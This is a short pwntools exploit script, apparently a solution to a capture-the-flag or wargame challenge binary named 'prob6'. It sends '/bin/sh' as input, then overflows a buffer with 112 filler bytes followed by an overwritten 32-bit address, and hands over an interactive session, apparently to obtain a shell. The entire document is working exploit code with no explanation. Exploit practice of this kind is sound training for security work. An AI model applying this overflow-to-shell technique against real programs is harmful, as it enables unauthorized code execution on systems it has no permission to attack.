from pwn import *

p = process("./prob6")

p.recvuntil(": ")
p.sendline("/bin/sh")

p.recvuntil(": ")

payload = "A" * 112
payload += p32(0x0804C030)

pause()

p.sendline(payload)

p.interactive()